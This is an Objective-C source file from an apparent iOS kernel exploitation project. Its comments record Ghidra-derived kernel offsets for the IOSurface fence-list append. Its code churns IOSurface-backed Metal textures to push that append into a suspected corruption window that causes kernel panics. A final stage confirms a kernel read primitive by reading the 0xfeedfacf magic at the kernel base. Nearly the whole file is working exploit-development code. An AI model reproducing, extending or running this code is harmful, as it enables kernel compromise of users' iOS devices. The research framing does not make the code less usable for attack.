//
//  P127FencePress.m — the fence-list pressure + KRW self-test. p127.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Decode backing (the 23F77 Ghidra round, tonight):
//    - IOSurface::createWriteFence = 0x985ca48 (string-named fn). Builds the
//      IOFence, locks [surface+0x50], then IF a dependency fence is supplied
//      (param_2 != 0) calls FUN_0x984faf8(param_2, fence) = the fence-list
//      APPEND: lock +0x20, count +0x28, cap +0x2c, data +0x30 (cap==4 =
//      inline 4 slots at +0x38); full -> kalloc(count*16), copy, cap
//      doubles, then data[count*8] = fence; count++.
//    - the twice-aborted site (2/2 panics with our sids in x5, abort PC
//      0x984fcc8) = the range-check cluster of that append.
//    - entry wrappers: 0x985c960/0x985c9a8/0x985c9ec pass owner=0 (create
//      WITHOUT append); 0x985d01c = create-WITH-dependency (retains
//      param_2 twice = the append owner path).
//    - the drain walker 0x985c5fc unlinks lifecycle-done fence nodes from
//      lists @surface+0x230/+0x240 under the same +0x50 lock, poisons
//      freed nodes 0xcafecafe.
//    - macOS census pre-fact: NO userspace fence exports (the fence lane
//      is engine-driven) -> the pressure channel = real compositor/GPU
//      traffic on OUR sids, driven with public Metal-on-IOSurface APIs.
//
//  Pressure model: IOSurface-backed Metal textures, A->B -> B->A blit
//  pairs at wall-clock rate, with periodic surface RECYCLE (release +
//  recreate + rewrap): each recycle walks the fence teardown + drain
//  walker; each blit commit can attach/detach fences through the same
//  +0x50 lock. Bounded rounds, gaps, one tap, PANIC-POSSIBLE.
//
//  Stage 3 = the honest KRW SELF-TEST: P007KreadLane pickers, kread32
//  at the provider kbase, the 0xfeedfacf receipt. This tap NEVER claims
//  KRW beyond what the receipt shows and NEVER writes.
//

#import "P127FencePress.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007KreadLane.h"
#import "P007Board.h"
#import "LabBandit.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <stdarg.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P127_BUILD   @"p127-fencepress-v1"
#define P127_SURF_W  64
#define P127_SURF_H  64
#define P127_BURSTS  4        /* wall bursts */
#define P127_BURST_S 4.0      /* seconds per burst */
#define P127_GAP_MS  250      /* gap between bursts */
#define P127_RECYCLE 32       /* rounds between surface recycles */

static NSString *P127R(void);

/* ---- log ------------------------------------------------------------- */
static NSMutableString *g_buf;
static int g_fd = -1;
static CFMutableDictionaryRef g_dict;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

/* ---- IOSurface dlsym (p098/p114 law: dlsym-only, no IOSurface headers) - */
typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(void *);
static IOSurfaceCreate_t  g_surfCreate;
static IOSurfaceGetID_t   g_surfID;

static void p127_law_dict(void) {
    /* the p110 law dict: CFStringCreateWithCString keys, CFNumber values */
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    int32_t w = P127_SURF_W, h = P127_SURF_H, bpe = 4, bpr = P127_SURF_W * 4,
            as = P127_SURF_W * P127_SURF_H * 4;
    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberSInt32Type, &w);
    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberSInt32Type, &h);
    CFNumberRef ne = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);
    CFNumberRef nr = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpr);
    CFNumberRef na = CFNumberCreate(NULL, kCFNumberSInt32Type, &as);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), ne);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), nr);
    CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), na);
    CFRelease(nw); CFRelease(nh); CFRelease(ne); CFRelease(nr); CFRelease(na);
    g_dict = d;
}

static void p127_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p127", arms, 1, &sr, 0, "p127 auto-learn", "ok",
                      "survived", attr, sizeof attr);
    LabBanditRecord("p127", 0, outcome);
}

@implementation P127FencePress

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p127_fencepress_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p127 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P127_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] fence-append lane: createWriteFence @0x985ca48 appends to the");
    L(@"  DEPENDENT fence's list via 0x984faf8 (count+0x28/cap+0x2c/data");
    L(@"  +0x30, abort PC 0x984fcc8 = 2/2 with OUR sids in x5). Engine-");
    L(@"  driven only (no userspace fence exports). PANIC-POSSIBLE; one");
    L(@"  tap per force-quit; kread32 receipt = the ONLY KRW claim gate.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p127"];
    if (stop) { L(stop); p127_bandit("gated"); return P127R(); }

    /* ---- stage 1: the dlsym census (honest, iOS truth) --------------- */
    L(@"=== STAGE 1 fence dlsym census ===");
    void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
                       RTLD_NOW);
    const char *census[] = {
        "IOSurfaceCreateWriteFence", "IOSurfaceCreateReadFence",
        "IOSurfaceCreateFence", "IOSurfaceFenceCreate", "IOSurfaceFenceSignal",
        "IOSurfaceFenceWait", "IOSurfaceWaitOnFence", "IOSurfaceSetValues",
        "IOSurfaceCreateXPCObject", "IOSurfaceCreateMachPort", NULL };
    int resolved = 0;
    for (int i = 0; census[i]; i++) {
        void *s = dlsym(ios ? ios : RTLD_DEFAULT, census[i]);
        if (s) resolved++;
        Lf(@"  %-30s %@", census[i], s ? @"RESOLVED" : @"-");
    }
    Lf(@"  census: %d of %d resolved (macOS pre-fact: only SetValues/"
       @"XPCObject)", resolved, (int)(sizeof(census)/sizeof(census[0])) - 1);

    g_surfCreate = (IOSurfaceCreate_t)dlsym(ios ? ios : RTLD_DEFAULT,
                                             "IOSurfaceCreate");
    g_surfID     = (IOSurfaceGetID_t)dlsym(ios ? ios : RTLD_DEFAULT,
                                           "IOSurfaceGetID");
    if (!g_surfCreate || !g_surfID) {
        L(@"[-] IOSurface Create/GetID unresolved - honest stop, nothing churned.");
        p127_bandit("nodlsym"); return P127R();
    }
    p127_law_dict();

    /* ---- stage 2: the pressure (Metal textures on OUR sids) ---------- */
    L(@"=== STAGE 2 fence pressure (blit pairs + recycle) ===");
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { L(@"[-] no Metal device - honest stop."); p127_bandit("nodev");
                return P127R(); }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) { L(@"[-] no Metal queue - honest stop."); p127_bandit("noqueue");
              return P127R(); }

    MTLTextureDescriptor *td =
        [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:
         MTLPixelFormatBGRA8Unorm width:P127_SURF_W height:P127_SURF_H
         mipmapped:NO];
    td.storageMode = MTLStorageModeShared;

    unsigned long rounds = 0, commits = 0, recycles = 0, fails = 0;
    void *surfaces[2] = { NULL, NULL };
    id<MTLTexture> tex[2] = { NULL, NULL };

    for (int burst = 0; burst < P127_BURSTS; burst++) {
        NSDate *t0 = [NSDate date];
        while (-[t0 timeIntervalSinceNow] < P127_BURST_S) {
            @autoreleasepool {
                if (rounds % P127_RECYCLE == 0) {
                    /* recycle: fence teardown + drain walker + regrowth */
                    for (int k = 0; k < 2; k++) {
                        if (tex[k]) { tex[k] = NULL; }
                        if (surfaces[k]) { CFRelease(surfaces[k]);
                                           surfaces[k] = NULL; }
                    }
                    for (int k = 0; k < 2; k++) {
                        void *s = g_surfCreate(g_dict);
                        if (!s) { fails++; continue; }
                        tex[k] = [dev newTextureWithDescriptor:td
                                                     iosurface:(IOSurfaceRef)s
                                                         plane:0];
                        surfaces[k] = s;
                        if (!tex[k]) fails++;
                    }
                    recycles++;
                }
                if (!tex[0] || !tex[1]) { fails++; rounds++;
                                          [NSThread sleepForTimeInterval:0.01];
                                          continue; }
                uint32_t sid0 = surfaces[0] ? g_surfID(surfaces[0]) : 0;
                uint32_t sid1 = surfaces[1] ? g_surfID(surfaces[1]) : 0;
                (void)sid0; (void)sid1;
                id<MTLCommandBuffer> cb = [q commandBuffer];
                id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
                [e copyFromTexture:tex[0] sourceSlice:0 sourceLevel:0
                   sourceOrigin:MTLOriginMake(0,0,0) sourceSize:
                   MTLSizeMake(P127_SURF_W, P127_SURF_H, 1)
                   toTexture:tex[1] destinationSlice:0 destinationLevel:0
                   destinationOrigin:MTLOriginMake(0,0,0)];
                [e endEncoding];
                [cb commit];
                [cb waitUntilCompleted];
                commits++;
                rounds++;
            }
        }
        Lf(@"  burst %d/%d done: rounds=%lu commits=%lu recycles=%lu fails=%lu",
           burst + 1, P127_BURSTS, rounds, commits, recycles, fails);
        usleep(P127_GAP_MS * 1000);
    }
    Lf(@"  pressure summary: rounds=%lu commits=%lu recycles=%lu fails=%lu "
       @"survived=YES (no panic in-tap)", rounds, commits, recycles, fails);
    L(@"  [note] the 2/2 abort class fires OUT-OF-TAP (delayed teardown");
    L(@"  window). A post-force-quit panic log with PC band 0x984fcc8 =");
    L(@"  the fence-append range cluster catching our churn AGAIN = the");
    L(@"  corrupt-count window is live. A clean run that LATER panics =");
    L(@"  the SAME evidence (the window survives the tap, teardown catches");
    L(@"  it). No post-run panic at all = append stayed consistent (also a");
    L(@"  law data point: the 2/2 aborts needed a specific co-driver).");

    /* ---- stage 3: the honest KRW self-test --------------------------- */
    L(@"=== STAGE 3 KRW SELF-TEST (honest gate) ===");
    if (!P007LaneLive()) {
        L(@"  lane: CLOSED - no self-test primitive on this boot. Honest.");
        L(@"  [law] hasKread flips ONLY on the kread32 receipt in P007Board;");
        L(@"  a closed lane after fence pressure = the pressure prong is");
        L(@"  EVIDENCE, never KRW. Next levers stay: p010 truncated-KVA+");
        L(@"  fence-count window, then the p084-class TTE probe.");
        p127_bandit("lane-closed");
    } else {
        const char *ln = P007LaneName();
        uint64_t kb = P007LaneKbase();
        Lf(@"  lane: %@ (buffered=%@)", [NSString stringWithUTF8String:ln],
           P007LaneBuffered() ? @"YES" : @"NO");
        if (kb && P007LaneKRead32(kb) == 0xfeedfacfULL) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx MH magic receipt=0xfeedfacf)",
               kb);
            p127_bandit("selftest-read-pass");
        } else {
            L(@"  KRW SELF-TEST READ: FAIL/HOLD (lane live but no feedfacf "
              @"receipt this tap)");
            p127_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [[P007Board shared] kreadSignal]);
        L(@"  [law] no write prong fired this tap (no explicit ask); this");
        L(@"  print is a REPORT of the receipt, never a KRW claim.");
    }

    Lf(@"=== p127 end %@ ===", LabLocalMilitaryNow());
    return P127R();
}

static NSString *P127R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

@end